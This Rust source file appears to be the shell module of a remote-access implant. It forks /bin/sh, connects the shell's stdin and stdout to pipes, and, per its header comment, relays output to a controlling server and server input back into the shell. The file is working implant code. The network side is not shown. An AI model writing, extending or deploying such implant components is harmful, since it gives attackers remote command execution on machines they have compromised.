/* Documntation:
spawns /bin/sh and wires it to the socket
implant side: shell stdout -> ShellData -> server
server side sends ShellData -> shell stdin.
no pty yet just pipes (man 2 pipe, man 2 dup2).
*/

use std::os::unix::io::RawFd;

// keeps the 3 fds for the kid shell
pub struct Shell {
    pub stdin_fd: RawFd,  // we write here, shell reads
    pub stdout_fd: RawFd, // shell writes here, we read
    pub pid: libc::pid_t,
}

pub fn spawn_shell() -> Shell {
    // man 2 pipe: pipe() makes 2 fds, [0] read end, [1] write end
    let mut _in_pipe = [0 as libc::c_int; 2];
    let mut _out_pipe = [0 as libc::c_int; 2];

    unsafe {
        if libc::pipe(_in_pipe.as_mut_ptr()) < 0 {
            eprintln!("Could not pipe stdin.");
            std::process::exit(1);
        }
        if libc::pipe(_out_pipe.as_mut_ptr()) < 0 {
            eprintln!("Could not pipe stdout.");
            std::process::exit(1);
        }

        // man 2 fork: kid gets 0, parent gets kid pid
        let _pid = libc::fork();
        if _pid < 0 {
            eprintln!("Could not fork shell.");
            std::process::exit(1);
        }

        if _pid == 0 {
            // kid: hook pipes onto stdin/stdout/stderr then exec sh
            libc::dup2(_in_pipe[0], 0); // stdin reads from parent
            libc::dup2(_out_pipe[1], 1); // stdout goes to parent
            libc::dup2(_out_pipe[1], 2); // stderr too, so we see errors

            libc::close(_in_pipe[0]);
            libc::close(_in_pipe[1]);
            libc::close(_out_pipe[0]);
            libc::close(_out_pipe[1]);

            let _sh = std::ffi::CString::new("/bin/sh").unwrap();
            let _arg0 = std::ffi::CString::new("sh").unwrap();
            let _args = [_arg0.as_ptr() as *const libc::c_char, std::ptr::null()];

            libc::execv(_sh.as_ptr(), _args.as_ptr());
            // only gets here if exec failed
            libc::_exit(1);
        }

        // parent: close the ends we dont use
        libc::close(_in_pipe[0]);
        libc::close(_out_pipe[1]);

        Shell {
            stdin_fd: _in_pipe[1],
            stdout_fd: _out_pipe[0],
            pid: _pid,
        }
    }
}

pub fn shell_write(_fd: RawFd, data: &[u8]) {
    // loop it, write can short-write too
    let mut _left = data;
    while !_left.is_empty() {
        let res;
        unsafe {
            res = libc::write(
                _fd,
                _left.as_ptr() as *const std::ffi::c_void,
                _left.len() as libc::size_t,
            );
        }
        if res <= 0 {
            break;
        }
        _left = &_left[res as usize..];
    }
}

pub fn shell_read(_fd: RawFd, buffer: &mut [u8]) -> libc::ssize_t {
    let res;
    unsafe {
        res = libc::read(
            _fd,
            buffer.as_mut_ptr() as *mut std::ffi::c_void,
            buffer.len() as libc::size_t,
        );
    }
    res
}
